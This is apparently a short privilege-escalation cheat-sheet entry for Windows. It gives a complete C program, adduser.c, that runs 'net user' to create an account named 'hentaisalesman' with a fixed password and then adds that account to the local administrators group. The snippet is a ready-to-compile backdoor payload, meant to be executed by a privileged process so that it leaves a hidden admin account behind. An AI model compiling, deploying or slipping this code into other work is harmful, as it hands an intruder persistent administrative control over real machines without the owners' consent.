> C is a general-purpose computer programming language. It was created in the 1970s by Dennis Ritchie, and remains very widely used and influential.


#Windows_Privilege_Escalation 

`adduser.c` binary to add a user E.g., `hentaisalesman` to `administrators` local group
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hentaisalesman password123! /add");
  i = system ("net localgroup administrators hentaisalesman /add");
  
  return 0;
}
```